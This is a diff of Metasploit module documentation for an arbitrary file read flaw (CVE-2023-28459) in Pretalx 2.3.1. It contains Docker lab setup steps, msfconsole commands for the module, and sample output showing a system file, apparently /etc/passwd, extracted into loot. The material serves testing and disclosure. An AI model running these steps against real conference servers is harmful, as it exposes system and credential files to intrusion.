@@ -1,44 +1,105 @@
-The following is the recommended format for module documentation. But feel free to add more content/sections to this.
-One of the general ideas behind these documents is to help someone troubleshoot the module if it were to stop
-functioning in 5+ years, so giving links or specific examples can be VERY helpful.
-
 ## Vulnerable Application
 
-Instructions to get the vulnerable application. If applicable, include links to the vulnerable install
-files, as well as instructions on installing/configuring the environment if it is different than a
-standard install. Much of this will come from the PR, and can be copy/pasted.
+Pretalx is a web-based conference planning tool, used to manage call for paper submissions, talk selection and so on. It used by many major IT conferences - such as OffensiveCon, Hexacon,... Versions 2.3.1 and prior are vulnerable to arbitrary file read, which exploits unsanitized path in schedule export. Module requires existing conference for successful exploitation. 
+
+Installation steps:
+
+1. `git clone https://github.com/pretalx/pretalx-docker.git`
+1. Change content of `docker-compose.yml` to following:
+```
+services:
+  pretalx:
+    image: pretalx/standalone:v2.3.1
+      # image: pretalx/dev
+    # build: .
+    container_name: pretalx
+    restart: unless-stopped
+    depends_on:
+      - redis
+      - db
+    environment:
+      # Hint: Make sure you serve all requests for the `/static/` and `/media/` paths when debug is False. See [installation](https://docs.pretalx.org/administrator/installation/#step-7-ssl) for more information
+      PRETALX_FILESYSTEM_MEDIA: /public/media
+      PRETALX_FILESYSTEM_STATIC: /public/static
+    ports:
+      - "80:80"
+    volumes:
+      - ./conf/pretalx.cfg:/etc/pretalx/pretalx.cfg:ro
+      - pretalx-data:/data
+      - pretalx-public:/public
+
+  db:
+    image: docker.io/library/postgres:15-alpine
+    container_name: pretalx-db
+    restart: unless-stopped
+    volumes:
+      - pretalx-database:/var/lib/postgresql/data
+    environment:
+      POSTGRES_PASSWORD: veryunsecureplschange # same password as one that you will put in pretalx.cfg file later on
+      POSTGRES_USER: pretalx
+      POSTGRES_DB: pretalx
+
+  redis:
+    image: redis:latest
+    container_name: pretalx-redis
+    restart: unless-stopped
+    volumes:
+      - pretalx-redis:/data
+
+volumes:
+  pretalx-database:
+  pretalx-data:
+  pretalx-public:
+  pretalx-redis:
+```
+1. `sudo docker-compose up`
+1. Setup username and password
+1. Go to `orga/event/` 
+1. Create new conference
+1. Go to `orga/event/[conference name]/schedule/rooms/`
+1. Create a room
+1. Go to `orga/event/[conference name]/` 
+1. Make conference go live
+1. `sudo docker exec -u 0 -it pretalx /bin/bash`
+1. Make sure you have correct right on `/data` folder, so `pretalx` user can write export there
+
 
 ## Verification Steps
-Example steps in this format (is also in the PR):
 
 1. Install the application
 1. Start msfconsole
-1. Do: `use [module path]`
+1. Do: `use auxiliary/scanner/http/pretalx_file_read_cve_2023_28459`
+1. Do: `set CONFERENCE_NAME [conference name]`
+1. Do: `set USERNAME [username]`
+1. Do: `set PASSWORD [password]`
+1. Do: `set RHOSTS [target IP address]`
 1. Do: `run`
-1. You should get a shell.
 
 ## Options
-List each option and how to use it.
 
-### Option Name
+### CONFERENCE_NAME
 
-Talk about what it does, and how to use it appropriately. If the default value is likely to change, include the default value here.
+### FILEPATH
+
+### MEDIA_URL
+
+### USERNAME
+
+### PASSWORD
 
 ## Scenarios
-Specific demo of using the module that might be useful in a real world scenario.
-
-### Version and OS
-
 ```
-code or console output
-```
-
-For example:
-
-To do this specific thing, here's how you do it:
-
-```
-msf > use module_name
-msf auxiliary(module_name) > set POWERLEVEL >9000
-msf auxiliary(module_name) > exploit
+msf auxiliary(scanner/http/pretalx_file_read_cve_2023_28459) > run verbose=true 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Detected vulnerable version 2.3.1
+[*] Register malicious proposal
+[*] Logging with credentials: [username]/[password]
+[*] Approving proposal
+[*] Adding h85WcLe4t4 to schedule
+[*] Releasing schedule
+[*] Trying to extract target file
+[*] Extraction successful
+[*] Stored results in /home/ms/.msf4/loot/20250725165914_default_192.168.168.146_pretalx.etcpas_473038.txt
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
 ```
